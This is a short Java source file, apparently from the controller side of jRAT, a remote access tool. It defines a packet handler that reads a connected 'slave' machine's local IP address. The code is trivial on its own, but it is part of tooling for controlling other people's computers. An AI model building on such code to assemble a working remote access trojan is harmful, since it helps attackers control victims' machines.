package jrat.controller.packets.incoming;

import jrat.controller.Slave;

public class Packet12InitLocalAddress extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave) throws Exception {
		String raw = slave.readLine();
		slave.setLocalIP(raw);
	}

}
